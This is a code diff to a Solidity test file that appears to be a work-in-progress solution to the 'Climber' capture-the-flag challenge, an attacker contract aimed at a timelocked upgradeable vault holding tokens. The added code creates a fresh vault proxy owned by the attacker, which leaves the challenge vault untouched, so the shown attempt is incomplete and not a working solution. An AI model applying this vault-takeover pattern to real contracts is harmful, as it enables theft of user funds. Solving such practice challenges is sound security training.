@@ -11,15 +11,18 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 contract ClimberAttacker is Test{
     ClimberVault vault;
     ClimberTimelock timelock;
+    DamnValuableToken token;
+
 
     address[] private _targets;
     uint256[] private _values;
     bytes[] private _dataElements;
     bytes32 private _salt;
 
-    constructor(ClimberVault _vault, ClimberTimelock _timelock){
+    constructor(ClimberVault _vault, ClimberTimelock _timelock, DamnValuableToken _token){
         vault = _vault;
         timelock = _timelock;
+        token = _token;
     }
    
    function attack() external{
@@ -56,6 +59,23 @@ contract ClimberAttacker is Test{
 
         console.log(address(this));
         console.log(vault.getSweeper());
+        console.log(token.balanceOf(address(vault)));
+
+        vault = ClimberVault(
+            address(
+                new ERC1967Proxy(
+                    address(new ClimberVault()), // implementation
+                    abi.encodeCall(ClimberVault.initialize, (address(this), address(this), address(this))) // initialization data
+                )
+            )
+        );
+
+        console.log(address(this));
+        console.log(vault.getSweeper());
+        console.log(token.balanceOf(address(vault)));
+
+
+
     } 
         
 }
@@ -137,7 +157,7 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        ClimberAttacker attacker = new ClimberAttacker(ClimberVault(vault),ClimberTimelock(timelock));
+        ClimberAttacker attacker = new ClimberAttacker(ClimberVault(vault),ClimberTimelock(timelock),DamnValuableToken(token));
         attacker.attack();
 
         // timelock.execute(targets, values, dataElements, salt);
